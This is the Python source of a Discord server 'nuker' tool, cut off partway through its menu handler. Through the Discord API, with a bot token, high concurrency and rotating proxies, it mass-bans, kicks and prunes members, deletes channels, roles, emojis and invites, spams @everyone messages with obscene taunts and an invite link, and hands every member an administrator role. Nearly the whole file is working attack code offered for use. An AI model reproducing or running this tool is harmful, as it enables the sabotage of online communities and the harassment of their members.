import asyncio
import aiohttp
import discord
from discord.ext import commands
from itertools import cycle
import random
import json
import os
import webbrowser
import base64
from datetime import datetime
import time

VERSION = '2.1.4'

GOLD_START = (255, 195, 0)  
BLUE_END   = (15, 82, 186)   
GREEN_START = (80, 200, 120)
GREEN_END = (50, 205, 50)
RED_START = (51, 0, 0)
RED_END = (255, 102, 102)

def gradient_text(text, start_color, end_color, bold=True):
    def rgb_to_256(r, g, b):
        r = round(r / 255 * 5)
        g = round(g / 255 * 5)
        b = round(b / 255 * 5)
        return 16 + (36 * r) + (6 * g) + b

    result = "\033[1m" if bold else ""
    length = len(text)
    for i, char in enumerate(text):
        ratio = i / max(length - 1, 1)
        r = int(start_color[0] + (end_color[0] - start_color[0]) * ratio)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * ratio)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * ratio)
        color_code = rgb_to_256(r, g, b)
        result += f"\033[38;5;{color_code}m{char}"
    result += "\033[0m"
    return result

def format_log_message(status, message, padding=50):
    timestamp = f"[{datetime.now():%Y-%m-%d %H:%M:%S}]"
    if status == "SUCCESS":
        full_message = f"{timestamp} (+) SUCCESS 【●】 ➪  {message:<{padding}}"
        return gradient_text(full_message, GREEN_START, GREEN_END, bold=True)
    elif status == "ERROR":
        full_message = f"{timestamp} (+) ERROR 【●】 ➪  {message:<{padding}}"
        return gradient_text(full_message, GOLD_START, RED_END, bold=True)
    else:
        full_message = f"{timestamp} (+) INFO 【●】 ➪  {message:<{padding}} │"
        return gradient_text(full_message, GOLD_START, BLUE_END, bold=True)

__intents__ = discord.Intents.default()
__intents__.members = True
__client__ = commands.Bot(command_prefix="+", help_command=None, intents=__intents__)

__config__ = None
config_folder = "configs"

os.system("cls") if os.name == "nt" else os.system("clear")

print(format_log_message("INFO", "Load config file or manual input? [c/m]", 50))
config_choice = input().strip().lower()

if config_choice == 'm':
    token = input(format_log_message("INFO", "Enter bot token", 50)).strip()
    if not token:
        print(format_log_message("ERROR", "Token is required!", 47))
        os._exit(1)
    max_concurrent = input(format_log_message("INFO", "Enter max concurrent tasks (default 200)", 50)).strip()
    max_concurrent = int(max_concurrent) if max_concurrent.isdigit() else 200
    use_proxy = input(format_log_message("INFO", "Use proxies? [y/n]", 50)).strip().lower() == 'y'
    __config__ = {
        "token": token,
        "max_concurrent": max_concurrent,
        "proxy": use_proxy,
        "nuke": {
            "channel_names": ["𝐁𝐎𝐒𝐒 𝐁𝐘 𝐁𝐎𝐒𝐒 ", "𝐅𝐔𝐂𝐊 𝐁𝐘 𝐁𝐎𝐒𝐒 𝐃𝐀𝐃𝐃𝐘", "𝐁𝐎𝐒𝐒 𝐃𝐀𝐃𝐃𝐘 𝐎𝐖𝐍𝐒 𝐔"],
            "roles_name": ["𝐁𝐎𝐒𝐒 𝐑𝐔𝐍𝐒 𝐘𝐎𝐔", "𝐁𝐎𝐒𝐒 𝐃𝐀𝐃𝐃𝐘 𝐎𝐖𝐍𝐙 𝐔", "𝐔𝐍𝐄𝐓𝐇𝐈𝐂𝐀𝐋 𝐒𝐘𝐍𝐃𝐈𝐂𝐀𝐓𝐄 𝐎𝐍 𝐓𝐎𝐏"],
            "messages_content": ["# @everyone BOSS DADDY OWNS U BICHES 🤡 https://discord.gg/whGAHQmdhm https://cdn.discordapp.com/attachments/1513192410094506125/1519785170037903381/1cdf0a1e7bcad93a6734d52e6df26cc0.jpg?ex=6a3ed1bc&is=6a3d803c&hm=17f9f78625c253b5d5506e47a1f7c80ebf723a0e8a18e947668d1af62849e3a1& https://www.youtube.com/@UNETHICALSYNDICATE"]
        }
    }
    print(format_log_message("SUCCESS", "Manual configuration loaded", 33))

    os.system("cls") if os.name == "nt" else os.system("clear")
else:
    os.system("cls") if os.name == "nt" else os.system("clear")
    if not os.path.exists(config_folder):
        print(format_log_message("ERROR", "'configs' folder not found.", 50))
        os._exit(1)

    config_files = [f for f in os.listdir(config_folder) if f.endswith(".json")]
    if not config_files:
        print(format_log_message("ERROR", "No JSON files found in 'configs' folder.", 50))
        os._exit(1)

    print(format_log_message("INFO", "Available Configs:", 50))
    print(gradient_text("╭" + "─" * 60 + "╮", GOLD_START, BLUE_END, bold=True))
    for i, config_file in enumerate(config_files, 1):
        print(gradient_text(f"│{i:<2}│ {config_file:<56}│", GOLD_START, BLUE_END, bold=True))
    print(gradient_text("╰" + "─" * 60 + "╯", GOLD_START, BLUE_END, bold=True))

    try:
        choice = int(input(format_log_message("INFO", "Choose config number", 50)).strip()) - 1
        if 0 <= choice < len(config_files):
            config_path = os.path.join(config_folder, config_files[choice])
            __config__ = json.load(open(config_path, "r", encoding="utf-8"))
            print(format_log_message("SUCCESS", f"Loaded {gradient_text(config_files[choice], GOLD_START, BLUE_END, bold=True)}", 56))
        else:
            print(format_log_message("ERROR", "Invalid choice!", 49))
            os._exit(1)
    except (ValueError, IndexError):
        print(format_log_message("ERROR", "Invalid input! Please enter a number.", 33))
        os._exit(1)

token = __config__["token"]
__max_concurrent__ = __config__.get("max_concurrent", 400)

os.system("cls") if os.name == "nt" else os.system("clear")

console_width = 140
new_banner = """
▄▄▄▄    ▒█████    ██████   ██████     ███▄ ▄███▓ ██▓ ███▄    █  ██▓ ███▄ ▄███▓ ██▓▒███████▒▓█████  ██▀███  
▓█████▄ ▒██▒  ██▒▒██    ▒ ▒██    ▒    ▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █ ▓██▒▓██▒▀█▀ ██▒▓██▒▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒
▒██▒ ▄██▒██░  ██▒░ ▓██▄   ░ ▓██▄      ▓██    ▓██░▒██▒▓██  ▀█ ██▒▒██▒▓██    ▓██░▒██▒░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒
▒██░█▀  ▒██   ██░  ▒   ██▒  ▒   ██▒   ▒██    ▒██ ░██░▓██▒  ▐▌██▒░██░▒██    ▒██ ░██░  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  
░▓█  ▀█▓░ ████▓▒░▒██████▒▒▒██████▒▒   ▒██▒   ░██▒░██░▒██░   ▓██░░██░▒██▒   ░██▒░██░▒███████▒░▒████▒░██▓ ▒██▒
░▒▓███▀▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░   ░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒ ░▓  ░ ▒░   ░  ░░▓  ░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
▒░▒   ░   ░ ▒ ▒░ ░ ░▒  ░ ░░ ░▒  ░ ░   ░  ░      ░ ▒ ░░ ░░   ░ ▒░ ▒ ░░  ░      ░ ▒ ░░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░
 ░    ░ ░ ░ ░ ▒  ░  ░  ░  ░  ░  ░     ░      ░    ▒ ░   ░   ░ ░  ▒ ░░      ░    ▒ ░░ ░ ░ ░ ░   ░     ░░   ░ 
 ░          ░ ░        ░        ░            ░    ░           ░  ░         ░    ░    ░ ░       ░  ░   ░     
      ░                                                                            ░                        
                                                                                  
                                                                    
                                                                                      
                                     
""".rstrip('\n').split('\n')
new_banner = '\n'.join(gradient_text(line.center(console_width), GOLD_START, BLUE_END, bold=True) for line in new_banner)

options = """
         ┌───────────────────────────────────────────────────────────────────────────────────────────┐         
         │                                SAKURA ON TOP                                 │         
┌────────└────────────────────────┬──────────────────────────────────────────┬───────────────────────┘────────┐
│                                 │                                          │                                │
│<01> Ban Members                 │<07> Delete Roles                         │<13> Change Icon                │
│                                 │                                          │                                │
│<02> Kick Members                │<08> Delete Emojis                        │<14> Change Guild               │
│                                 │                                          │                                │
│<03> Prune Members               │<09> Spam Channels                        │<15> Give Admin                 │
│                                 │                                          │                                │
│<04> Create Channels             │<10> Check Updates                        │<16> Delete Invites             │
│                                 │                                          │                                │
│<05> Create Roles                │<11> Credits                              │<17> Switch Guild               │
│                                 │                                          │                                │
│<06> Delete Channels             │<12> Nick All                             │<18> Exit                       │
│                                 │                                          │                                │
└──────┌──────────────────────────┴──────────────────────────────────────────┴───────────────────────┐────────┘
       │                                     HXNGOUT CREATION                                     │         
       └─────────────────────────────────────────────────────────────────────────────────────────────┘         
""".rstrip('\n').split('\n')
options = '\n'.join(gradient_text(line.center(console_width), GOLD_START, BLUE_END, bold=True) for line in options)

class shakti:
    def __init__(self, guildid, client):
        self.guildid = guildid
        self.guild = None
        self.client = client
        self.has_proxies = False
        self.proxy_count = 0
        try:
            with open("proxies.txt", "r") as f:
                proxy_list = f.read().splitlines()
            if not proxy_list:
                print(format_log_message("ERROR", "proxies.txt is empty. Disabling proxies.", 28))
            else:
                valid_proxies = []
                for proxy in proxy_list:
                    proxy = proxy.strip()
                    if proxy and ":" in proxy:
                        host, port = proxy.rsplit(":", 1)
                        if port.isdigit():
                            valid_proxies.append(proxy)
                        else:
                            print(format_log_message("ERROR", f"Invalid proxy port in '{gradient_text(proxy, GOLD_START, BLUE_END, bold=True)}'. Skipping.", 19))
                    else:
                        print(format_log_message("ERROR", f"Invalid proxy format: '{gradient_text(proxy, GOLD_START, BLUE_END, bold=True)}'. Skipping.", 16))
                if not valid_proxies:
                    print(format_log_message("ERROR", "No valid proxies found. Disabling proxies.", 23))
                else:
                    self.proxy_cycle = cycle(valid_proxies)
                    self.has_proxies = True
                    self.proxy_count = len(valid_proxies)
                    print(format_log_message("SUCCESS", f"Loaded {gradient_text(str(len(valid_proxies)), GREEN_START, GREEN_END, bold=True)} valid proxies for rotation.", 17))
        except FileNotFoundError:
            print(format_log_message("ERROR", "proxies.txt not found. Disabling proxies.", 24))
        except Exception as e:
            print(format_log_message("ERROR", f"Error reading proxies: {str(e)}", 15))

        self.version = cycle(['v10', 'v9'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.semaphore = asyncio.Semaphore(__max_concurrent__)

    async def async_input(self, prompt: str):
        return await self.client.loop.run_in_executor(None, lambda: input(prompt))

    async def _get_session(self):
        proxy_host = None
        if __config__["proxy"] and self.has_proxies:
            proxy_host = next(self.proxy_cycle)
        proxy = f"http://{proxy_host}" if proxy_host else None
        return aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=5000),
            timeout=aiohttp.ClientTimeout(total=None),
            connector_owner=True
        )

    async def execute_ban(self, member: str, token: str):
        async with self.semaphore:
            payload = {"delete_message_days": random.randint(0, 7)}
            async with await self._get_session() as session:
                try:
                    async with session.put(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans/{member}",
                        headers={"Authorization": f"Bot {token}"}, json=payload
                    ) as response:
                        if response.status in [200, 201, 204]:
                            print(format_log_message("SUCCESS", f"Banned {member}", 52))
                            self.banned.append(member)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {member}", 41))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        elif "Max number of bans" in await response.text():
                            print(format_log_message("ERROR", "Max bans exceeded", 47))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to ban {member}", 46))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to ban {member} | {e}", 46))
                    return False

    async def execute_kick(self, member: str, token: str):
        async with self.semaphore:
            async with await self._get_session() as session:
                try:
                    async with session.delete(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}",
                        headers={"Authorization": f"Bot {token}"}
                    ) as response:
                        if response.status in [200, 201, 204]:
                            print(format_log_message("SUCCESS", f"Kicked {member}", 52))
                            self.kicked.append(member)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {member}", 41))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to kick {member}", 46))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to kick {member} | {e}", 46))
                    return False

    async def execute_prune(self, days: int, token: str):
        async with self.semaphore:
            async with await self._get_session() as session:
                try:
                    payload = {"days": days}
                    async with session.post(
                        f"https://discord.com/api/v10/guilds/{self.guildid}/prune",
                        headers={"Authorization": f"Bot {token}"}, json=payload
                    ) as response:
                        if response.status == 200:
                            pruned = (await response.json()).get('pruned', 0)
                            print(format_log_message("SUCCESS", f"Pruned {pruned} members", 43))
                            return pruned
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", "Missing Permissions for pruning", 35))
                        elif response.status == 429:
                            pass
                        elif "Max number of prune" in await response.text():
                            print(format_log_message("ERROR", "Max prune reached", 46))
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                        else:
                            print(format_log_message("ERROR", "Failed to prune members", 41))
                        return 0
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to prune members | {e}", 41))
                    return 0

    async def execute_crechannels(self, channelsname: str, type_: int, token: str):
        async with self.semaphore:
            payload = {"type": type_, "name": channelsname.replace(" ", "-"), "permission_overwrites": []}
            async with await self._get_session() as session:
                try:
                    async with session.post(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/channels",
                        headers={"Authorization": f"Bot {token}"}, json=payload
                    ) as response:
                        if response.status == 201:
                            channel_id = (await response.json())['id']
                            print(format_log_message("SUCCESS", f"Created channel ID {channel_id}", 42))
                            self.channels.append(1)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for #{payload['name']}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to create #{payload['name']}", 40))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to create #{payload['name']} | {e}", 40))
                    return False

    async def execute_creroles(self, rolesname: str, token: str):
        async with self.semaphore:
            colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
            payload = {"name": rolesname, "color": colors}
            async with await self._get_session() as session:
                try:
                    async with session.post(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles",
                        headers={"Authorization": f"Bot {token}"}, json=payload
                    ) as response:
                        if response.status == 200:
                            role_id = (await response.json())['id']
                            print(format_log_message("SUCCESS", f"Created role ID {role_id}", 45))
                            self.roles.append(1)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for @{rolesname}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to create @{rolesname}", 40))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to create @{rolesname} | {e}", 40))
                    return False

    async def execute_delchannels(self, channel: str, token: str):
        async with self.semaphore:
            async with await self._get_session() as session:
                try:
                    async with session.delete(
                        f"https://discord.com/api/{next(self.version)}/channels/{channel}",
                        headers={"Authorization": f"Bot {token}"}
                    ) as response:
                        if response.status == 200:
                            print(format_log_message("SUCCESS", f"Deleted channel {channel}", 42))
                            self.channels.append(channel)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {channel}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to delete {channel}", 44))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to delete {channel} | {e}", 44))
                    return False

    async def execute_delroles(self, role: str, token: str, retries=3, base_delay=1.0):
        async with self.semaphore:
            for attempt in range(retries):
                async with await self._get_session() as session:
                    try:
                        async with session.delete(
                            f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles/{role}",
                            headers={"Authorization": f"Bot {token}"}
                        ) as response:
                            if response.status == 204:
                                print(format_log_message("SUCCESS", f"Deleted role {role}", 45))
                                self.roles.append(role)
                                return True
                            elif "Missing Permissions" in await response.text():
                                print(format_log_message("ERROR", f"Missing Permissions for role {role}", 35))
                                return False
                            elif response.status == 429:
                                try:
                                    data = await response.json()
                                    retry_after = data.get('retry_after', base_delay)
                                    await asyncio.sleep(retry_after)
                                    continue
                                except ValueError:
                                    return False
                            else:
                                return False
                    except Exception:
                        return False
                if attempt < retries - 1:
                    await asyncio.sleep(base_delay * (2 ** attempt))
            return False

    async def execute_delemojis(self, emoji: str, token: str):
        async with self.semaphore:
            async with await self._get_session() as session:
                try:
                    async with session.delete(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/emojis/{emoji}",
                        headers={"Authorization": f"Bot {token}"}
                    ) as response:
                        if response.status == 204:
                            print(format_log_message("SUCCESS", f"Deleted emoji {emoji}", 45))
                            self.emojis.append(emoji)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {emoji}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to delete {emoji}", 44))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to delete {emoji} | {e}", 44))
                    return False

    async def execute_massping(self, channel: str, content: str, token: str):
        async with self.semaphore:
            if not content:
                content = "@everyone @here Server nuked by Ultimate Speed!"
            payload = {"content": content}
            async with await self._get_session() as session:
                try:
                    async with session.post(
                        f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages",
                        headers={"Authorization": f"Bot {token}"}, json=payload
                    ) as response:
                        if response.status == 200:
                            print(format_log_message("SUCCESS", f"Spammed in {channel}", 47))
                            self.messages.append(channel)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {channel}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to spam in {channel}", 42))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to spam in {channel} | {e}", 42))
                    return False

    async def execute_nick_all(self, member: str, new_nick: str, token: str):
        async with self.semaphore:
            payload = {"nick": new_nick}
            async with await self._get_session() as session:
                try:
                    async with session.patch(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}",
                        headers={"Authorization": f"Bot {token}"}, json=payload
                    ) as response:
                        if response.status == 200:
                            print(format_log_message("SUCCESS", f"Changed nickname for {member}", 39))
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {member}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to nick {member}", 46))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to nick {member} | {e}", 46))
                    return False

    async def execute_change_icon(self, token: str):
        if not os.path.exists("Guild-Icon"):
            print(format_log_message("ERROR", "Guild-Icon folder not found!", 38))
            return False
        images = [f for f in os.listdir("Guild-Icon") if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp'))]
        if not images:
            print(format_log_message("ERROR", "No images in Guild-Icon folder!", 36))
            return False
        print(format_log_message("INFO", "Available Icons:", 50))
        print(gradient_text("╭" + "─" * 60 + "╮", GOLD_START, BLUE_END, bold=True))
        for i, img in enumerate(images, 1):
            print(gradient_text(f"│ {i:<2} │ {img:<56} │", GOLD_START, BLUE_END, bold=True))
        print(gradient_text("╰" + "─" * 60 + "╯", GOLD_START, BLUE_END, bold=True))
        try:
            choice_input = await self.async_input(format_log_message("INFO", "Choose icon number", 50))
            choice = int(choice_input.strip()) - 1
            if 0 <= choice < len(images):
                img_path = os.path.join("Guild-Icon", images[choice])
                with open(img_path, "rb") as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                ext = images[choice].split('.')[-1]
                payload = {"icon": f"data:image/{ext};base64,{img_data}"}
                async with self.semaphore:
                    async with await self._get_session() as session:
                        async with session.patch(
                            f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}",
                            headers={"Authorization": f"Bot {token}"}, json=payload
                        ) as response:
                            if response.status in [200, 204]:
                                print(format_log_message("SUCCESS", "Changed guild icon", 42))
                                return True
                            else:
                                print(format_log_message("ERROR", "Failed to change guild icon", 38))
                                return False
            else:
                print(format_log_message("ERROR", f"Invalid choice: {gradient_text(choice_input, GOLD_START, BLUE_END, bold=True)}!", 47))
                return False
        except ValueError:
            print(format_log_message("ERROR", f"Invalid input: {gradient_text(choice_input, GOLD_START, BLUE_END, bold=True)}!", 49))
            return False

    async def execute_change_guild_info(self, token: str):
        new_name = await self.async_input(format_log_message("INFO", "New guild name", 50))
        new_name = new_name.strip()
        new_desc = await self.async_input(format_log_message("INFO", "New guild description", 50))
        new_desc = new_desc.strip()
        if not new_name:
            print(format_log_message("ERROR", "Name required!", 48))
            return False
        payload = {"name": new_name}
        if new_desc:
            payload["description"] = new_desc
        async with self.semaphore:
            async with await self._get_session() as session:
                async with session.patch(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}",
                    headers={"Authorization": f"Bot {token}"}, json=payload
                ) as response:
                    if response.status in [200, 204]:
                        print(format_log_message("SUCCESS", f"Guild updated: {gradient_text(new_name, GOLD_START, BLUE_END, bold=True)}", 43))
                        return True
                    else:
                        print(format_log_message("ERROR", "Failed to update guild", 42))
                        return False

    async def execute_give_admin(self, token: str):
        start_time = time.time()
        success_count = 0
        async with self.semaphore:
            async with await self._get_session() as session:
                try:
                    admin_role_payload = {"name": "Admin", "color": 0xFF0000, "permissions": "8"}
                    async with session.post(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles",
                        headers={"Authorization": f"Bot {token}"}, json=admin_role_payload
                    ) as role_resp:
                        if role_resp.status != 200:
                            print(format_log_message("ERROR", "Failed to create admin role", 36))
                            return (0, 0)
                        admin_role_id = (await role_resp.json())['id']
                        print(format_log_message("SUCCESS", f"Created admin role {admin_role_id}", 39))
                    user_input = await self.async_input(format_log_message("INFO", "User IDs (comma-separated) or 'all'", 50))
                    user_input = user_input.strip()
                    users_to_admin = []
                    if user_input.lower() == 'all':
                        async with session.get(
                            f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members?limit=1000",
                            headers={"Authorization": f"Bot {token}"}
                        ) as members_resp:
                            if members_resp.status != 200:
                                print(format_log_message("ERROR", "Failed to fetch members", 40))
                                return (0, 0)
                            members = await members_resp.json()
                            users_to_admin = [member['user']['id'] for member in members]
                    else:
                        users_to_admin = [uid.strip() for uid in user_input.split(',') if uid.strip()]
                        if not users_to_admin:
                            print(format_log_message("ERROR", "No valid user IDs provided!", 32))
                            return (0, 0)
                    
                    total_attempts = len(users_to_admin)
                    
                    async def assign_admin_role(user_id):
                        nonlocal success_count
                        try:
                            async with session.get(
                                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                                headers={"Authorization": f"Bot {token}"}
                            ) as member_resp:
                                if member_resp.status != 200:
                                    return False
                                member_data = await member_resp.json()
                                current_roles = member_data.get('roles', [])
                                if admin_role_id not in current_roles:
                                    current_roles.append(admin_role_id)
                                assign_payload = {"roles": current_roles}
                                async with session.patch(
                                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                                    headers={"Authorization": f"Bot {token}"}, json=assign_payload
                                ) as response:
                                    if response.status in [200, 204]:
                                        print(format_log_message("SUCCESS", f"Assigned admin to {user_id}", 41))
                                        success_count += 1
                                        return True
                                    else:
                                        return False
                        except Exception:
                            return False

                    tasks = [self.semaphore.acquire() for _ in users_to_admin]
                    await asyncio.gather(*tasks)
                    
                    tasks = [assign_admin_role(user_id) for user_id in users_to_admin]
                    await asyncio.gather(*tasks)
                    
                    end_time = time.time()
                    return (success_count, end_time - start_time)

                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to assign admin roles | {e}", 36))
                    return (0, 0)


    async def execute_delete_invites(self, token: str):
        start_time = time.time()
        async with self.semaphore:
            async with await self._get_session() as session:
                try:
                    async with session.get(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/invites",
                        headers={"Authorization": f"Bot {token}"}
                    ) as invites_resp:
                        if invites_resp.status == 200:
                            invites = await invites_resp.json()
                            total_invites = len(invites)
                            deleted = 0
                            
                            async def delete_invite(invite_code):
                                nonlocal deleted
                                async with self.semaphore:
                                    async with await self._get_session() as del_session:
                                        async with del_session.delete(
                                            f"https://discord.com/api/{next(self.version)}/invites/{invite_code}",
                                            headers={"Authorization": f"Bot {token}"}
                                        ) as del_resp:
                                            if del_resp.status in [200, 204]:
                                                deleted += 1
                                                return True
                                            return False
                                            
                            tasks = [delete_invite(invite['code']) for invite in invites]
                            await asyncio.gather(*tasks)
                            end_time = time.time()
                            return (deleted, end_time - start_time, total_invites)
                        else:
                            print(format_log_message("ERROR", "Failed to fetch invites", 41))
                            return (0, 0, 0)
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to fetch invites | {e}", 41))
                    return (0, 0, 0)


    async def menu(self):
        os.system("cls") if os.name == "nt" else os.system("clear")
        if os.name == "nt":
            os.system(f"title Nuker | Max Concurrent: {__max_concurrent__}")
        print(new_banner)
        print(gradient_text("   MADE BY HXNGOUT ".center(console_width), GOLD_START, BLUE_END, bold=True))
        print(gradient_text(f"     LOADED PROXIES:<{self.proxy_count}>".center(console_width), GOLD_START, BLUE_END, bold=True))
        print(gradient_text("    HXNGOUT ON TOP ".center(console_width), GOLD_START, BLUE_END, bold=True))
        print(options)
        ans = await self.async_input(format_log_message("INFO", "Select Option", 50))
        ans = ans.strip()

        if ans in ["1", "01"]:
            scrape = await self.async_input(format_log_message("INFO", "Fetch member IDs? [Y/N]", 50))
            scrape = scrape.strip().lower()
            if scrape == "y":
                try:
                    os.makedirs("fetched", exist_ok=True)
                    guild = __client__.get_guild(int(self.guildid))
                    if guild:
                        with open("fetched/members.txt", "w") as f:
                            for member in guild.members:
                                f.write(f"{member.id}\n")
                        print(format_log_message("SUCCESS", f"Fetched {len(guild.members)} members", 38))
                    else:
                        print(format_log_message("ERROR", "Guild not found!", 47))
                        await self.menu()
                        return
                except Exception as e:
                    print(format_log_message("ERROR", f"Error fetching members | {e}", 41))
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                if not members:
                    print(format_log_message("ERROR", "No members found. Fetch first.", 33))
                    await self.menu()
                    return
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error reading members | {e}", 41))
                await self.menu()
                return

            self.banned.clear()
            start_time = time.time()
            tasks = [self.execute_ban(member, token) for member in members]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Banned {len(self.banned)}/{len(members)} members in ({duration:.2f}s)", 36))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["2", "02"]:
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                if not members:
                    print(format_log_message("ERROR", "No members found. Fetch first.", 33))
                    await self.menu()
                    return
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error reading members | {e}", 41))
                await self.menu()
                return

            self.kicked.clear()
            start_time = time.time()
            tasks = [self.execute_kick(member, token) for member in members]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Kicked {len(self.kicked)}/{len(members)} members in ({duration:.2f}s)", 36))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["3", "03"]:
            try:
                days_input = await self.async_input(format_log_message("INFO", "Prune days (0-7)", 50))
                days = int(days_input.strip())
                if 0 <= days <= 7:
                    start_time = time.time()
                    pruned_count = await self.execute_prune(days, token)
                    end_time = time.time()
                    duration = end_time - start_time
                    if pruned_count > 0:
                        print(format_log_message("SUCCESS", f"Pruned {pruned_count} members in ({duration:.2f}s)", 43))
                else:
                    print(format_log_message("ERROR", f"Days must be 0-7: {gradient_text(days_input, GOLD_START, BLUE_END, bold=True)}!", 46))
            except ValueError:
                print(format_log_message("ERROR", f"Invalid number: {gradient_text(days_input, GOLD_START, BLUE_END, bold=True)}!", 48))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["4", "04"]:
            type_input = await self.async_input(format_log_message("INFO", "Channel type ['t'ext/'v'oice]", 50))
            type_ = 2 if type_input.strip().lower() == 'v' else 0
            try:
                amount_input = await self.async_input(format_log_message("INFO", "Amount", 50))
                amount = int(amount_input.strip())
                if amount <= 0:
                    raise ValueError
            except ValueError:
                print(format_log_message("ERROR", f"Invalid amount: {gradient_text(amount_input, GOLD_START, BLUE_END, bold=True)}!", 47))
                await self.menu()
                return

            self.channels.clear()
            start_time = time.time()
